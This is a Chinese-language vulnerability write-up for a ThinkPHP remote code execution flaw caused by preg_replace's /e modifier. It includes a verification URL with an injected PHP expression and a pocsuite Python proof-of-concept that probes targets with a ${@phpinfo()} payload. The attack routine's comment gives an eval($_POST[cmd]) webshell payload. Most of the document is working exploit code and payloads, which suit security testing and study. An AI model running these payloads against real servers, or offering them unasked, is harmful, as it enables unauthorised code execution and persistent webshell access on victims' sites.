一. 漏洞简介

漏洞描述：在thinkphp框架/trunk/ThinkPHP/Lib/Core/Dispatcher.class.php中存在$res = preg_replace('@(w+)'.$depr.'([^'.$depr.'/]+)@e', '$var['/1']="/2";', implode($depr,$paths));这样大代码，

这里明显使用了preg_replace的/e参数，这是个非常危险的参数，如果用了这个参数，preg_replace第二个参数就会被当做php代码执行

漏洞评级：严重

参考连接：https://www.kafan.cn/edu/2405521.html


二. 利用条件

thinkphp版本过低

三. 漏洞验证

直接访问index.php/module/action/param1/${@print(THINK_VERSION)}该连接，查看页面是否会输出thinkphp的版本号

    #验证漏洞 pocsuite -r 4-thinkphp-getshell.py -u 10.1.5.26 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        import urlparse
        vul_url = urlparse.urlparse(self.url).scheme + "://" + urlparse.urlparse(self.url).netloc
        send_payload = "/index.php/module/aciton/param1/${@phpinfo()}"
        url = vul_url + send_payload
        #print url

        try:
            r = req.get(url=url, timeout=5,allow_redirects=False) #禁止重定向
            if r.status_code == 200 and "<title>phpinfo()</title>" in r.text:
                #print u"存在漏洞"
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Payload'] = send_payload
            else:
                result = {}

        except Exception,e:
            #print "error!"
            result = {}

        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        # /index.php/module/action/param1/{${eval($_POST[cmd])}}
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(ThinkphpPOC)
